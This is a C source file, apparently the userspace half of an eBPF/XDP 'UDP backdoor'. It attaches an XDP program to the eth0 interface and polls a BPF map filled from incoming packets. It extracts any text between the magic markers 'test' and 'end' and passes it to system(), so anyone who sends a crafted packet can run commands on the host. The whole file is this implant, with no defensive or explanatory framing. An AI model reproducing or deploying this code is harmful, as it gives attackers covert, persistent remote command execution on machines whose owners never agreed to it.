// https://github.com/feiskyer/ebpf-apps/blob/main/loadbalancer/xdp/xdp-proxy.c
// https://github.com/feiskyer/ebpf-apps/blob/main/bpf-apps/execsnoop.c
#include <stdio.h>
#include <unistd.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <net/if.h>
#include <linux/types.h>
#include <linux/if_link.h>
#include "xdp_udp_backdoor_bpf.h"

/* Attach to lo by default */
#define DEV_NAME "eth0"
#define SIZE 180
#define START_MAGIC "test"
#define END_MAGIC "end"
#define START_MAGIC_SIZE sizeof(START_MAGIC)-1

void exec(char value[SIZE]);

int main(int argc, char **argv)
{
	__u32 xdp_flags = XDP_FLAGS_UPDATE_IF_NOEXIST | XDP_FLAGS_SKB_MODE;
	struct xdp_udp_backdoor_bpf *obj;
	int err = 0;
	int key = 0;
	char value[SIZE];

	struct rlimit rlim_new = {
		.rlim_cur = RLIM_INFINITY,
		.rlim_max = RLIM_INFINITY,
	};

	err = setrlimit(RLIMIT_MEMLOCK, &rlim_new);
	if (err)
	{
		fprintf(stderr, "failed to change rlimit\n");
		return 1;
	}

	unsigned int ifindex = if_nametoindex(DEV_NAME);
	if (ifindex == 0)
	{
		fprintf(stderr, "failed to find interface %s\n", DEV_NAME);
		return 1;
	}

	obj = xdp_udp_backdoor_bpf__open();
	if (!obj)
	{
		fprintf(stderr, "failed to open and/or load BPF object\n");
		return 1;
	}

	err = xdp_udp_backdoor_bpf__load(obj);
	if (err)
	{
		fprintf(stderr, "failed to load BPF object %d\n", err);
		goto cleanup;
	}

	/* Attach the XDP program to eth0 */
	int prog_id = bpf_program__fd(obj->progs.xdp_func);
	err = bpf_set_link_xdp_fd(ifindex, prog_id, xdp_flags);
	if (err)
	{
		fprintf(stderr, "failed to attach BPF programs\n");
		goto cleanup;
	}

	//printf("Successfully run! Tracing /sys/kernel/debug/tracing/trace_pipe.\n");
	//system("cat /sys/kernel/debug/tracing/trace_pipe");


	/*
	   struct xdp_program *prog = NULL;

	   prog = xdp_program__open_file("xdp_udp_backdoor_bpf.o", "xdp_backdoor", NULL);
	   if (!prog) {
	   printf("Error, load xdp prog failed\n");
	   return 1;
	   }

	   struct bpf_object *bpf_obj = xdp_program__bpf_obj(prog);
	   int map_fd = bpf_object__find_map_fd_by_name(bpf_obj, "command");
	   */

	int map_fd = bpf_map__fd(obj->maps.command);
	printf("map_fd:%d\n", map_fd);
	while(1){
		if (bpf_map_lookup_elem(map_fd, &key, value) == 0){
			if (value[0] != '\x00'){
				printf("value: %s\n", value);
				exec(value);

				value[0] = '\x00';
				bpf_map_update_elem(map_fd,&key, value, BPF_ANY);
			}
		}
		sleep(1);
	}

cleanup:
	/* detach and free XDP program on exit */
	bpf_set_link_xdp_fd(ifindex, -1, xdp_flags);
	xdp_udp_backdoor_bpf__destroy(obj);
	return err != 0;
}

void exec(char value[SIZE]){
	char *ret;
	char cmd[SIZE]={'\x00'};
	int i = 0;

	ret = strstr(value, START_MAGIC);
	if (ret) {
		ret = strstr(value, END_MAGIC);
		int count=ret-(value + START_MAGIC_SIZE);
		//printf("count:%d\n", count);
		if (ret){
			while(count > 0) {
				cmd[i] = value[START_MAGIC_SIZE+i];
				i++;
				count--;
			}
			printf("cmd: %s\n", cmd);
			system(cmd);
		}
	}
}
